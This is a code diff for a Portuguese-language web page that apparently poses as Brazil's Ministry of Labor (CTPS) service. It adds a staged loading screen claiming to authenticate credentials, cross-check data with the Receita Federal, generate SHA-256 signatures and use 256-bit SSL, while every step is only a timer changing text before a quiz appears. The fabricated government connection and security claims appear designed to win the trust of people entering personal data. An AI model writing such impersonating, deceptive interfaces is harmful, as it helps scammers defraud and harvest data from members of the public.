@@ -261,9 +261,14 @@ document.addEventListener('DOMContentLoaded', function() {
                 
                 <div id="carteira-loading" class="text-center">
                     <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-                    <p class="text-gray-700">Conectando ao Ministério do Trabalho...</p>
+                    <p id="loading-message" class="text-gray-700 font-medium">Conectando ao Ministério do Trabalho...</p>
+                    <p id="loading-details" class="text-gray-500 text-sm mt-1">Estabelecendo conexão segura</p>
                     <div class="mt-4 bg-gray-200 rounded-full h-2">
                         <div class="bg-blue-600 h-2 rounded-full transition-all duration-1000" style="width: 0%" id="progress-bar"></div>
+                    </div>
+                    <div class="mt-3 flex items-center justify-center text-xs text-gray-500">
+                        <i class="fas fa-shield-alt mr-1"></i>
+                        <span>Conexão criptografada SSL 256-bit</span>
                     </div>
                 </div>
                 
@@ -286,19 +291,8 @@ document.addEventListener('DOMContentLoaded', function() {
         
         document.body.appendChild(overlay);
         
-        // Animar barra de progresso
-        setTimeout(() => {
-            document.getElementById('progress-bar').style.width = '100%';
-        }, 500);
-        
-        // Após 3 segundos, mostrar quiz
-        setTimeout(() => {
-            document.getElementById('carteira-loading').classList.add('hidden');
-            document.getElementById('carteira-quiz').classList.remove('hidden');
-            
-            // Gerar opções de data
-            gerarQuizData(dados);
-        }, 3000);
+        // Sequência de etapas de validação
+        iniciarSequenciaValidacao();
         
         // Botão fechar
         document.getElementById('fechar-carteira').addEventListener('click', function() {
@@ -618,6 +612,78 @@ document.addEventListener('DOMContentLoaded', function() {
         `;
         
         document.body.appendChild(modal);
+    }
+    
+    function iniciarSequenciaValidacao() {
+        const etapas = [
+            {
+                delay: 800,
+                progresso: 15,
+                mensagem: "Conectando ao Ministério do Trabalho...",
+                detalhes: "Estabelecendo conexão segura"
+            },
+            {
+                delay: 1200,
+                progresso: 30,
+                mensagem: "Autenticando credenciais...",
+                detalhes: "Verificando certificados digitais"
+            },
+            {
+                delay: 1000,
+                progresso: 50,
+                mensagem: "Acessando base de dados CTPS...",
+                detalhes: "Consultando registros profissionais"
+            },
+            {
+                delay: 1500,
+                progresso: 70,
+                mensagem: "Validando informações pessoais...",
+                detalhes: "Cruzando dados com Receita Federal"
+            },
+            {
+                delay: 1200,
+                progresso: 85,
+                mensagem: "Gerando assinatura eletrônica...",
+                detalhes: "Criando hash de validação SHA-256"
+            },
+            {
+                delay: 800,
+                progresso: 100,
+                mensagem: "Conexão estabelecida com sucesso",
+                detalhes: "Sistema pronto para validação"
+            }
+        ];
+        
+        let etapaAtual = 0;
+        
+        function proximaEtapa() {
+            if (etapaAtual < etapas.length) {
+                const etapa = etapas[etapaAtual];
+                
+                setTimeout(() => {
+                    const progressBar = document.getElementById('progress-bar');
+                    const loadingMessage = document.getElementById('loading-message');
+                    const loadingDetails = document.getElementById('loading-details');
+                    
+                    if (progressBar) progressBar.style.width = etapa.progresso + '%';
+                    if (loadingMessage) loadingMessage.textContent = etapa.mensagem;
+                    if (loadingDetails) loadingDetails.textContent = etapa.detalhes;
+                    
+                    etapaAtual++;
+                    proximaEtapa();
+                }, etapa.delay);
+            } else {
+                // Finalizar loading e mostrar quiz
+                setTimeout(() => {
+                    const dados = JSON.parse(localStorage.getItem('dadosInscricao'));
+                    document.getElementById('carteira-loading').classList.add('hidden');
+                    document.getElementById('carteira-quiz').classList.remove('hidden');
+                    gerarQuizData(dados);
+                }, 1000);
+            }
+        }
+        
+        proximaEtapa();
     }
     
     function configurarSugestoesEmail() {
